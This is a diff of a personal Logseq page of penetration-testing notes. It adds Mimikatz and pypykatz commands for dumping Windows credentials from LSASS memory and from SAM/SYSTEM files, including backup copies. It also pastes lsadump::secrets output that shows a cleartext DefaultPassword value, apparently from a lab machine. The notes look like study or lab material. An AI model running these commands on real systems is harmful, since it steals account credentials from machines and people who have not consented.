@@ -41,15 +41,43 @@ public:: true
 				  ```bash
 				  pypykatz lsa minidump lsass.DMP
 				  ```
-- To extract sensible data from the `lsass` process' memory the [`sekurlsa`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) module can be used. In order to properly work it requires one of the following accounts/permissions.
-	- Administrator user. In this case you need to get `debug` privilege via `privilege::debug`.
-	  logseq.order-list-type:: number
-	- SYSTEM account. In this case `debug` privilege is not needed.
-	  logseq.order-list-type:: number
+- LSASS Credentials
+	- To extract sensible data from the `lsass` process' memory the [`sekurlsa`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) module can be used. In order to properly work it requires one of the following accounts/permissions.
+		- In case you are the Administrator user, then you need to get `debug` privilege via `privilege::debug`.
+		  logseq.order-list-type:: number
+		- If you are the SYSTEM account, then you can skip `privilege::debug`.
+		  logseq.order-list-type:: number
+		- ```mimikatz
+		  privilege::debug
+		  sekurlsa::logonPasswords
+		  ```
+- To extract credentials from the local SAM and SYSTEM files you first need to impersonate the SYSTEM user
+	- ```mimikatz
+	  token::elevate
+	  lsadump::sam
+	  ```
+	- In case you find a backup of SAM and SYSTEM files, you can point them to `lsadump` to dump their contents
+	  ```mimikatz
+	  token::elevate
+	  lsadump::sam /sam:C:\windows.old\windows\system32\sam /system:C:\windows.old\windows\system32\system
+	  ```
+		- *Please note that you'll only find local users in SAM and SYSTEM.*
+- Found defaultpassword via `lsadump::secrets` but I'm not sure what it is
+  ```mimikatz
+  mimikatz # lsadump::secrets
+  
+  [...]
+  Secret  : DefaultPassword                                                     
+  cur/text: 7k8XHk3dMtmpnC7  
+  [...]
+  ```
+	- TODO reserach
+	  background-color:: red
 - Plain-text password in Mimikatz output
   id:: 65663778-7eae-4a4d-a668-3bb7eff7d34d
 	- Sometimes Mimikatz returns plain-text passwords instead of their hashes, this is because [[WDigest]] is enabled.
 	- That's the case of older operating systems like Windows 7, or operating systems where Wdigest has been manually enabled.
+- Dump
 - Abusing TGT and service tickets
 	- To dump tickets from LSASS process memory we can use the [`sekurlsa::tickets`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#tickets) command.
 	  {{embed ((65686a95-2f8d-4c16-ba29-4ec6ce616cb4))}}
